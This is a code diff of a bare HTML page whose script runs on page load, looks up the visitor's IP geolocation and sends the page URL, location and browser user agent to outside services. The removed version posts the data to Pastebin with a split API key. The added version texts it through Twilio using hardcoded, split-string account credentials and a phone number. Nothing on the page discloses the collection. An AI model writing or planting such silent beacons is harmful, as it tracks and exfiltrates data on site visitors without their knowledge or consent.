@@ -1,18 +1,17 @@
 <html>
   <body>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/1.1.3/axios.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/twilio.js/1.2.0/twilio.min.js"></script>
     <script>
         document.addEventListener("DOMContentLoaded", async function() {
             const geoloc = JSON.stringify((await fetch("https://api.db-ip.com/v2/free/self")).json());
-            await axios.post("https://pastebin.com/api/api_post.php",
-                {
-                    api_user_key: "d63f7fee51d94c4" + "b310e4038b455681d",
-                    api_paste_private: 1,
-                    api_paste_name: "Web " + new Date(),
-                    api_paste_expire_date: "1Y",
-                    api_paste_code: JSON.stringify([window.location.href, geoloc, Navigator.userAgent])
-                }
-            );
+            
+            var client = new twilio("AC8ad19b1198d9315d" + "1be94f1b9caeab43", "59c3ab9a2a1d7b50957" + "8886c5f821e02");
+
+            client.messages.create({
+              to: '+16502721417',
+              from: '+16502721417',
+              body: JSON.stringify([(new Date()).toString(), window.location.href, geoloc, Navigator.userAgent])
+            });
         });
     </script>
   </body>
